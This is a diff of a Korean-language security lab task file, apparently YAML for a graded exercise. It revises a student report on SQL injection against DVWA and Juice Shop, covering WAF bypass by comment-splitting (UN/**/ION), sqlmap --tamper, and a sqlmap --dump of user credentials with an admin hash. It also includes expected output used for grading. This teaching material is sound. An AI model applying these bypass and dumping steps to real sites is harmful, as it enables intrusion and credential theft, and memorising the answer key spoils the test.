       ## 1. 수동 UNION SQLi: dvwa <관찰코드>  (예: 403 = 942→949110 차단)
-      ## 2. WAF 우회: 대소문자 tamper <코드> / 주석분할(UN/**/ION) <코드>  (뚫린 쪽·막힌 쪽)
-      ## 3. sqlmap: 자동 SQLi 4기법 결과 요약
-      ## 4. 분석: dvwa(<코드> 차단) vs juice(<코드> 탐지만). 방어 = parameterized query(근본) + WAF(보조)
+      ## 2. WAF 우회: sqlmap --tamper <관찰> (스캐너는 CRS anomaly에 여전히 403 / 단발 주석분할은 수작업 빈틈)
+      ## 3. sqlmap --dump: juice Users 계정/비번 실제 추출 결과 요약
+      ## 4. 분석: dvwa(WAF <코드> 차단) vs juice(취약·추출). 방어 = parameterized query(근본) + WAF(보조)
       ## 결론: (네 판단)
       ```
       작성 후 `cat ~/w04_sqli_report.md` 로 확인한다.
@@ -414,9 +417,9 @@ steps:
       ssh att@192.168.0.202 'cat > ~/w04_sqli_report.md <<'"'"'EOF'"'"'
       # 공격 W04 SQLi 보고서
       ## 1. 수동 UNION SQLi: dvwa 403(942→949110 차단)
-      ## 2. WAF 우회: 대소문자 tamper→정규화로 차단(403), 주석분할(UN/**/ION)→302 우회(정규화 빈틈)
-      ## 3. sqlmap: 자동 SQLi 테스트(4기법) — 효율적이나 시끄러움
-      ## 4. 분석: dvwa(403 차단) vs juice(200 탐지만). 방어=parameterized query(근본)+WAF(보조)
+      ## 2. WAF 우회: sqlmap --tamper(space2comment)도 CRS anomaly에 403 차단. 단발 주석분할은 libinjection 빈틈(302, 수작업)
+      ## 3. sqlmap --dump: juice Users 계정/비번(admin=0192023a...b500) 실제 추출. 효율적이나 시끄러움
+      ## 4. 분석: dvwa(WAF 403 차단) vs juice(DetectionOnly 취약·추출). 방어=parameterized query(근본)+WAF(보조)
       ## 결론: 고전 SQLi는 CRS가 잘 막음. 우회는 어렵고 시끄럽다. 근본 방어는 코드
       EOF
       cat ~/w04_sqli_report.md'
@@ -424,9 +427,9 @@ steps:
     expected_output: |
       # 공격 W04 SQLi 보고서
       ## 1. 수동 UNION SQLi: dvwa 403(942→949110 차단)
-      ## 2. WAF 우회: 대소문자 tamper→정규화로 차단(403), 주석분할(UN/**/ION)→302 우회(정규화 빈틈)
-      ## 3. sqlmap: 자동 SQLi 테스트(4기법) — 효율적이나 시끄러움
-      ## 4. 분석: dvwa(403 차단) vs juice(200 탐지만). 방어=parameterized query(근본)+WAF(보조)
+      ## 2. WAF 우회: sqlmap --tamper(space2comment)도 CRS anomaly에 403 차단. 단발 주석분할은 libinjection 빈틈(302, 수작업)
+      ## 3. sqlmap --dump: juice Users 계정/비번(admin=0192023a...b500) 실제 추출. 효율적이나 시끄러움
+      ## 4. 분석: dvwa(WAF 403 차단) vs juice(DetectionOnly 취약·추출). 방어=parameterized query(근본)+WAF(보조)
       ## 결론: 고전 SQLi는 CRS가 잘 막음. 우회는 어렵고 시끄럽다. 근본 방어는 코드
     verify:
       type: output_contains
